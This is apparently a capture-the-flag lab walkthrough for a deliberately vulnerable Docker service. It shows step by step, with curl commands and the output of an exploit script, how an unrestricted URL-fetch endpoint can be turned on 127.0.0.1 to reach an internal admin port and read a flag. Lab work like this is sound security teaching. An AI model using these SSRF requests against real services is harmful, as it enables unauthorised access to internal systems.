# Walkthrough: Surfer

## Setup

```bash
docker compose up --build -d
```

Confirm the service:

```bash
curl http://localhost:8080/
```

Output:
```
URL Preview Service v1.0

Endpoints:
  GET /fetch?url=<url>  -- fetch a URL and return its content
```

## Step 1: Probe the Fetch Endpoint

```bash
curl "http://localhost:8080/fetch?url=http://example.com/"
```

The server fetches `example.com` and returns its HTML. No restriction is visible on which URLs can be fetched.

## Step 2: Turn the Fetcher Inward

Ask the server to fetch itself:

```bash
curl "http://localhost:8080/fetch?url=http://127.0.0.1:8080/"
```

Output:
```
URL Preview Service v1.0
...
```

The server successfully fetched its own service. It makes outbound requests to `127.0.0.1` without restriction.

## Step 3: Probe Internal Ports

The public service is on port 8080. Try the adjacent port 9000:

```bash
curl "http://localhost:8080/fetch?url=http://127.0.0.1:9000/admin"
```

Output:
```
POC{...}
```

The internal admin service on port 9000 accepts requests from `127.0.0.1`. Because the app made the request on behalf of the attacker, its source IP is `127.0.0.1`, and the admin check passes.

## Automated Exploit

```bash
python3 exploit/exploit.py http://localhost:8080
```

Output:
```
[*] Target: http://localhost:8080
[*] Service info:
URL Preview Service v1.0

Endpoints:
  GET /fetch?url=<url>  -- fetch a URL and return its content

[*] Step 2: testing /fetch with a loopback URL...
    response: 'URL Preview Service v1.0'

[*] Step 3: SSRF to http://127.0.0.1:9000/admin
    response: 'POC{...}'

[+] Flag: POC{...}
```
